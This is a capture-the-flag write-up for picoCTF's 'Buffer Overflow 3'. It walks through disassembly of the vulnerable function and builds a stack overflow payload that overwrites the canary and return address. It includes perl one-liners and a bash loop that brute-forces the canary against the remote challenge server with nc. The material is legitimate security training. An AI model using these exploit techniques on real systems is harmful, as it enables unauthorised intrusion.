# Buffer Overflow 3

Looking for the vulnerability: we see that when we read `x` we ensure we read
fewer than `BUFSIZE` characters, storing this value in `length`. We then
`sscanf(length, "%d", &count)`, an `count` is then used for the next read. So if
we write to `x` a value greater than `BUFSIZE`, e.g. `10000` then the `sscanf`
call will set `count` to this value allowing us to overflow in the next `read`

Inspecting the stack of `vuln`, looking until the `read` call where `buf` is
used:

``` 
$ objdump -d -Mintel vuln | sed -n '/^[a-f0-9]\+ <vuln>/,/^$/p' 
08049489 <vuln>:
 8049489:	f3 0f 1e fb          	endbr32 
 804948d:	55                   	push   ebp
 804948e:	89 e5                	mov    ebp,esp
 8049490:	53                   	push   ebx
 8049491:	81 ec 94 00 00 00    	sub    esp,0x94
 8049497:	e8 d4 fd ff ff       	call   8049270 <__x86.get_pc_thunk.bx>
 804949c:	81 c3 64 2b 00 00    	add    ebx,0x2b64
 80494a2:	c7 45 f4 00 00 00 00 	mov    DWORD PTR [ebp-0xc],0x0
 80494a9:	c7 c0 54 c0 04 08    	mov    eax,0x804c054
 80494af:	8b 00                	mov    eax,DWORD PTR [eax]
 80494b1:	89 45 f0             	mov    DWORD PTR [ebp-0x10],eax # load canary into stack
 80494b4:	83 ec 0c             	sub    esp,0xc  # canary copied onto stack
 80494b7:	8d 83 c0 e0 ff ff    	lea    eax,[ebx-0x1f40]
 80494bd:	50                   	push   eax
 80494be:	e8 7d fc ff ff       	call   8049140 <printf@plt>
 80494c3:	83 c4 10             	add    esp,0x10
 80494c6:	eb 31                	jmp    80494f9 <vuln+0x70>
 80494c8:	8b 45 f4             	mov    eax,DWORD PTR [ebp-0xc]
 80494cb:	8d 95 70 ff ff ff    	lea    edx,[ebp-0x90]
 80494d1:	01 d0                	add    eax,edx
 80494d3:	83 ec 04             	sub    esp,0x4
 80494d6:	6a 01                	push   0x1
 80494d8:	50                   	push   eax
 80494d9:	6a 00                	push   0x0
 80494db:	e8 50 fc ff ff       	call   8049130 <read@plt>
 80494e0:	83 c4 10             	add    esp,0x10
 80494e3:	8d 95 70 ff ff ff    	lea    edx,[ebp-0x90]
 80494e9:	8b 45 f4             	mov    eax,DWORD PTR [ebp-0xc]
 80494ec:	01 d0                	add    eax,edx
 80494ee:	0f b6 00             	movzx  eax,BYTE PTR [eax]
 80494f1:	3c 0a                	cmp    al,0xa
 80494f3:	74 0c                	je     8049501 <vuln+0x78>
 80494f5:	83 45 f4 01          	add    DWORD PTR [ebp-0xc],0x1
 80494f9:	83 7d f4 3f          	cmp    DWORD PTR [ebp-0xc],0x3f
 80494fd:	7e c9                	jle    80494c8 <vuln+0x3f>
 80494ff:	eb 01                	jmp    8049502 <vuln+0x79>
 8049501:	90                   	nop
 8049502:	83 ec 04             	sub    esp,0x4
 8049505:	8d 85 6c ff ff ff    	lea    eax,[ebp-0x94]
 804950b:	50                   	push   eax
 804950c:	8d 83 f2 e0 ff ff    	lea    eax,[ebx-0x1f0e]
 8049512:	50                   	push   eax
 8049513:	8d 85 70 ff ff ff    	lea    eax,[ebp-0x90]
 8049519:	50                   	push   eax
 804951a:	e8 c1 fc ff ff       	call   80491e0 <__isoc99_sscanf@plt>
 804951f:	83 c4 10             	add    esp,0x10
 8049522:	83 ec 0c             	sub    esp,0xc
 8049525:	8d 83 f5 e0 ff ff    	lea    eax,[ebx-0x1f0b]
 804952b:	50                   	push   eax
 804952c:	e8 0f fc ff ff       	call   8049140 <printf@plt>
 8049531:	83 c4 10             	add    esp,0x10
 8049534:	8b 85 6c ff ff ff    	mov    eax,DWORD PTR [ebp-0x94]
 804953a:	83 ec 04             	sub    esp,0x4
 804953d:	50                   	push   eax
 804953e:	8d 45 b0             	lea    eax,[ebp-0x50]
 8049541:	50                   	push   eax
 8049542:	6a 00                	push   0x0
 8049544:	e8 e7 fb ff ff       	call   8049130 <read@plt>
<--- SNIP --->
```

We see just before the second `read` there is a load `lea eax,[ebp-0x50]` which
we expect to be our buffer, so the buffer starts at `ebp-0x50` but `ebp` is
`0x4` byes from the return address, so the buffer is `0x50 + 0x4 = 0x54`. Also
note that the canary is at `ebp-0x10`, i.e. directly above the buffer. So we
should be able to construct a payload like:

  - A large number to be read in as `count`
  - `0x40` bytes of junk to fill up the buffer
  - `0x4` bytes of the canary
  - `0x10` bytes of junk to fill the rest of the stack
  - The address of the `win` function

Testing locally:

``` 
$ echo 'ABCD' > canary.txt
$ perl -E 'say "flag" x 0x10' > flag.txt
$ perl -e 'print("10000\n" . "A" x 0x40 . "ABCD" . "A" x 0x10 .  "\xaa\xbb\xcc\xdd") | ./vuln
How Many Bytes will You Write Into the Buffer?
> Input> Ok... Now Where's the Flag?
flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagfla
Segmentation fault (core dumped)
```

Where `\xaa\xbb\xcc\xdd` is just a mocked address for `win`. For the actual
program, we'll need to figure out the canary. Thankfully we can just brute-force
this byte-by-byte (and there's only 4 bytes). Since we can control the `count`
for the second `read` command we can:

  - Set this value to the length of the buffer + 1
  - Fill the buffer with random values, then
  - send 1 more value to guess at the first byte of the canary
  - If stack smashing is detected, go back to the first step, otherwise we've
    found the first byte

As a convenience, let's assume the canary is alphanumeric, then we can guess the
first byte via:

``` console
$ for c in {{A..Z},{a..z},{0..9}}; \
    do CANARY="$c" perl -e 'print(0x41 . "\n" . "A" x 0x40 . $ENV{CANARY} .  "\n")' \
    | nc saturn.picoctf.net 61604 \
    | grep 'Flag' >/dev/null \
    && echo "$c" \
    && break; \
done
```

We can then proceed to brute-force the rest of the canary (you could of course
script this to determine the entire canary in one go, but that seemed too much
effort to fit into one-line in bash and I didn't feel like writing a script).
Then substituting the canary used for our local test and pointing at the remote
yields the key.
